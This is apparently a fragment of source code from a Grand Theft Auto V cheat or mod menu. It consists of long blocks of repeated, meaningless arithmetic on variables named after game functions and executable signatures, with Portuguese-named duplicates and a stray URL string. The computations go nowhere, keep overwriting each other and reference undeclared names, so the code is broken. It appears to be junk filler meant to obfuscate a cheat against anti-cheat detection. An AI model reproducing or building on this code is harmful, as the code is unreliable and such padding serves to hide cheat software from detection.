			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			string str = URL;
			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
